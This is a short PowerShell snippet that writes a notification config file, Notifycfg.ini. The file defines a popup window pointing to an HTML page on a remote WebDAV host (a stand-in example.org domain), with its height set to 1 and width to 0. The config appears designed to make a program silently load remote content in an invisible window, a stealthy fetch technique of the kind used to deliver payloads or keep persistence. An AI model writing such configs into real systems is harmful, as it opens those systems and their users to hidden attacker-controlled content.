$config = @'
[PopWindow42]
Address="file://new-host.example.org/DavWWWRoot/assets/new.htm"
Height=1
Width=0
'@
Set-Content -LiteralPath 'Notifycfg.ini' -Value $config
